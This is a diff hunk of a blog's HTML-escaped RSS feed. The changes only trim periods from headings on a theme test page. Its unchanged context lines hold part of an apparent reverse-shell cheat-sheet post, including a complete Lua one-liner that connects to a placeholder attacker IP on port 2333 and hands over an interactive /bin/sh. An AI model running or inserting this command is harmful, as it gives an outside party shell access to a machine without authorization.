@@ -942,20 +942,20 @@ p &lt;span style="color:#f92672">=&lt;/span> r.exec&lt;span style="color:#f92672
 p.waitFor&lt;span style="color:#f92672">()&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lua-版本">Lua 版本&lt;/h2>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">lua -e &lt;span style="color:#e6db74">&amp;#34;require(&amp;#39;socket&amp;#39;);require(&amp;#39;os&amp;#39;);t=socket.tcp();t:connect(&amp;#39;attackerip&amp;#39;,&amp;#39;2333&amp;#39;);os.execute(&amp;#39;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#39;);&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test</title><link>https://hare.one/test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://hare.one/test/</guid><description>&lt;h1 id="这是一个测试页面">这是一个测试页面。&lt;/h1>
+&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test</title><link>https://hare.one/test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://hare.one/test/</guid><description>&lt;p>这是一个测试页面&lt;/p>
 &lt;h2 id="用于测试博客主题的修改markdown-的样式等">用于测试博客主题的修改、markdown 的样式等&lt;/h2>
 &lt;h2 id="test-1">TEST 1&lt;/h2>
-&lt;h1 id="this-is-an-h1-tag">This is an &amp;lt;h1&amp;gt; tag.&lt;/h1>
+&lt;h1 id="this-is-an-h1-tag">This is an &amp;lt;h1&amp;gt; tag&lt;/h1>
 &lt;h2 id="test-2">TEST 2&lt;/h2>
-&lt;h2 id="this-is-an-h2-tag">This is an &amp;lt;h2&amp;gt; tag.&lt;/h2>
+&lt;h2 id="this-is-an-h2-tag">This is an &amp;lt;h2&amp;gt; tag&lt;/h2>
 &lt;h2 id="test-3">TEST 3&lt;/h2>
-&lt;h3 id="this-is-an-h3-tag">This is an &amp;lt;h3&amp;gt; tag.&lt;/h3>
+&lt;h3 id="this-is-an-h3-tag">This is an &amp;lt;h3&amp;gt; tag&lt;/h3>
 &lt;h2 id="test-4">TEST 4&lt;/h2>
-&lt;h4 id="this-is-an-h4-tag">This is an &amp;lt;h4&amp;gt; tag.&lt;/h4>
+&lt;h4 id="this-is-an-h4-tag">This is an &amp;lt;h4&amp;gt; tag&lt;/h4>
 &lt;h2 id="test-5">TEST 5&lt;/h2>
-&lt;h5 id="this-is-an-h5-tag">This is an &amp;lt;h5&amp;gt; tag.&lt;/h5>
+&lt;h5 id="this-is-an-h5-tag">This is an &amp;lt;h5&amp;gt; tag&lt;/h5>
 &lt;h2 id="test-6">TEST 6&lt;/h2>
-&lt;h6 id="this-is-an-h6-tag">This is an &amp;lt;h6&amp;gt; tag.&lt;/h6>
+&lt;h6 id="this-is-an-h6-tag">This is an &amp;lt;h6&amp;gt; tag&lt;/h6>
 &lt;h2 id="test-7">TEST 7&lt;/h2>
 &lt;p>&lt;strong>This line has some bold text&lt;/strong>.&lt;/p>
 &lt;h2 id="test-8">TEST 8&lt;/h2>
